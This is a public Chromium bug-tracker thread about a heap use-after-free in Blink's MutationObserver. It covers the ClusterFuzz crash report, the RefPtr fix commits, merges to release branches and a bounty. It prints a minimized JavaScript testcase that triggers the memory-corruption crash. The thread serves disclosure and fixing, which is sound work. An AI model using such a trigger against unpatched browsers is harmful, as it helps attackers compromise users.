[add] http://crrev.com/a17c2c87065be2c4dcb586583b1d69a5c85dae20/third_party/WebKit/LayoutTests/fast/dom/MutationObserver/mutation-and-deletion-race-expected.txt
[add] http://crrev.com/a17c2c87065be2c4dcb586583b1d69a5c85dae20/third_party/WebKit/LayoutTests/fast/dom/MutationObserver/mutation-and-deletion-race.html
[modify] http://crrev.com/a17c2c87065be2c4dcb586583b1d69a5c85dae20/third_party/WebKit/Source/core/dom/MutationObserverInterestGroup.cpp
[modify] http://crrev.com/a17c2c87065be2c4dcb586583b1d69a5c85dae20/third_party/WebKit/Source/core/dom/MutationObserverInterestGroup.h
[modify] http://crrev.com/a17c2c87065be2c4dcb586583b1d69a5c85dae20/third_party/WebKit/Source/core/dom/Node.cpp
[modify] http://crrev.com/a17c2c87065be2c4dcb586583b1d69a5c85dae20/third_party/WebKit/Source/core/dom/Node.h


### ko...@chromium.org (2015-11-19)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-11-19)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-11-20)

ClusterFuzz has detected this issue as fixed in range 360535:360565.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6232469256273920

Uploader: wfh@chromium.org
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x60d00008043c
Crash State:
  blink::MutationObserver::enqueueMutationRecord
  blink::MutationObserverInterestGroup::enqueueMutationRecord
  blink::ChildListMutationAccumulator::enqueueMutationRecord
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=268656:269696
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=360535:360565

Minimized Testcase (0.88 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96zsglx6ppOaQcnGqdsxdVsK0W7z9KbwHOcxF77GmEidQNVoDXiz9qh8ngwIyWhpLqm0set7MxXmVjw5CAFMGLbxWeE6sQIa6Jv950wlcADjxI_QRcwYm0vB4ZsYxUJ_ZoTo8U8mSdBQURDXj3Fc8ZevU6SzA
<script>
        o1335=document.createElementNS('http://www.w3.org/1999/xhtml','input');
        o1442=document.createElementNS('http://www.w3.org/1999/xhtml','script');
        o1444=document.createElement('iframe');
        o1442.appendChild(o1444);
        document.documentElement.appendChild(o1442);
        o1444.appendChild(o1335);
        o1467=document.createElementNS('http://www.w3.org/1999/xhtml','input');
        o1470=new MutationObserver(function() {} );
        o1470.observe(o1335, {childList: true});
        o1490=document.createElementNS('http://www.w3.org/1999/xhtml','script');
        o1491=document.createTextNode('glob_appendscript_1018()');
        o1490.appendChild(o1491);
        o1467.appendChild(o1490);
        o1335.appendChild(o1467);
function glob_appendscript_1018() {
        o1470['disconnect']();
        delete o1470;
        gc();
}
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect,try re-doing that job on the test case report page.

### ti...@google.com (2015-11-23)

[Empty comment from Monorail migration]

### ti...@google.com (2015-11-23)

Congrats your change is auto-approved for M48 (branch: 2564)

### bu...@chromium.org (2015-11-25)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/3078f2fcb3d109a9d89e266987ba2d319335a27a

commit 3078f2fcb3d109a9d89e266987ba2d319335a27a
Author: Takayoshi Kochi <kochi@chromium.org>
Date: Wed Nov 25 05:03:56 2015

Use RefPtr for MutationObserver in MutationObserverInterestGroup.

In MutaionObserverInterestGroup, MutationObservers were held in HashSet
as raw pointers.  In case a MutationObserver is gone while mutation
events are collected (and garbage collector collects the object),
it causes use-after-free while the code tries to enqueue the recorded
mutation events.  Use RefPtr<> to hold the pointer so that the object
will be kept until it goes out of scope.

BUG=557981
TEST=fast/dom/MutationObserver/mutation-and-deletion-race.html

Review URL: https://codereview.chromium.org/1463433002

Cr-Commit-Position: refs/heads/master@{#360541}
(cherry picked from commit a17c2c87065be2c4dcb586583b1d69a5c85dae20)

Review URL: https://codereview.chromium.org/1473023006 .

Cr-Commit-Position: refs/branch-heads/2564@{#117}
Cr-Branched-From: 1283eca15bd9f772387f75241576cde7bdec7f54-refs/heads/master@{#359700}

[add] http://crrev.com/3078f2fcb3d109a9d89e266987ba2d319335a27a/third_party/WebKit/LayoutTests/fast/dom/MutationObserver/mutation-and-deletion-race-expected.txt
[add] http://crrev.com/3078f2fcb3d109a9d89e266987ba2d319335a27a/third_party/WebKit/LayoutTests/fast/dom/MutationObserver/mutation-and-deletion-race.html
[modify] http://crrev.com/3078f2fcb3d109a9d89e266987ba2d319335a27a/third_party/WebKit/Source/core/dom/MutationObserverInterestGroup.cpp
[modify] http://crrev.com/3078f2fcb3d109a9d89e266987ba2d319335a27a/third_party/WebKit/Source/core/dom/MutationObserverInterestGroup.h
[modify] http://crrev.com/3078f2fcb3d109a9d89e266987ba2d319335a27a/third_party/WebKit/Source/core/dom/Node.cpp
[modify] http://crrev.com/3078f2fcb3d109a9d89e266987ba2d319335a27a/third_party/WebKit/Source/core/dom/Node.h


### ko...@chromium.org (2015-11-25)

Adding merge request to M47.

### bu...@chromium.org (2015-11-25)

The following revision refers to this bug:
  https://chrome-internal.googlesource.com/bling/chromium.git/+/3078f2fcb3d109a9d89e266987ba2d319335a27a

commit 3078f2fcb3d109a9d89e266987ba2d319335a27a
Author: Takayoshi Kochi <kochi@chromium.org>
Date: Wed Nov 25 05:03:56 2015


### ss...@google.com (2015-11-25)

Adding OS linux, please change if needed.

### in...@chromium.org (2015-11-25)

[Empty comment from Monorail migration]

### ti...@google.com (2015-11-26)

[Automated comment] Less than 2 weeks to go before stable on M47, manual review required.

### ti...@google.com (2015-11-28)

#18: Justification for M47 patch release - high severity externally reported security bug.

### ss...@google.com (2015-12-01)

Merge approved for M47 (branch 2526)

### bu...@chromium.org (2015-12-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/31fa53fb590398f2791ca949753c3d681786bcdb

commit 31fa53fb590398f2791ca949753c3d681786bcdb
Author: Takayoshi Kochi <kochi@chromium.org>
Date: Wed Dec 02 04:01:18 2015

Use RefPtr for MutationObserver in MutationObserverInterestGroup.

In MutaionObserverInterestGroup, MutationObservers were held in HashSet
as raw pointers.  In case a MutationObserver is gone while mutation
events are collected (and garbage collector collects the object),
it causes use-after-free while the code tries to enqueue the recorded
mutation events.  Use RefPtr<> to hold the pointer so that the object
will be kept until it goes out of scope.

BUG=557981
TEST=fast/dom/MutationObserver/mutation-and-deletion-race.html

Review URL: https://codereview.chromium.org/1463433002

Cr-Commit-Position: refs/heads/master@{#360541}
(cherry picked from commit a17c2c87065be2c4dcb586583b1d69a5c85dae20)

Review URL: https://codereview.chromium.org/1495433002 .

Cr-Commit-Position: refs/branch-heads/2526@{#494}
Cr-Branched-From: cb947c0153db0ec02a8abbcb3ca086d88bf6006f-refs/heads/master@{#352221}

[add] http://crrev.com/31fa53fb590398f2791ca949753c3d681786bcdb/third_party/WebKit/LayoutTests/fast/dom/MutationObserver/mutation-and-deletion-race-expected.txt
[add] http://crrev.com/31fa53fb590398f2791ca949753c3d681786bcdb/third_party/WebKit/LayoutTests/fast/dom/MutationObserver/mutation-and-deletion-race.html
[modify] http://crrev.com/31fa53fb590398f2791ca949753c3d681786bcdb/third_party/WebKit/Source/core/dom/MutationObserverInterestGroup.cpp
[modify] http://crrev.com/31fa53fb590398f2791ca949753c3d681786bcdb/third_party/WebKit/Source/core/dom/MutationObserverInterestGroup.h
[modify] http://crrev.com/31fa53fb590398f2791ca949753c3d681786bcdb/third_party/WebKit/Source/core/dom/Node.cpp
[modify] http://crrev.com/31fa53fb590398f2791ca949753c3d681786bcdb/third_party/WebKit/Source/core/dom/Node.h


### ti...@google.com (2015-12-07)

[Empty comment from Monorail migration]

### ti...@google.com (2015-12-08)

Congrats - $2000 for this report. I'll add this into the next payment run. The release notes should come out tomorrow with a patch to M47.

### ti...@google.com (2015-12-14)

[Empty comment from Monorail migration]

### ti...@google.com (2016-01-05)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-03-02)

This security bug has been closed for more than 14 weeks. Removing view restrictions.

- Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/557981?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083223)*
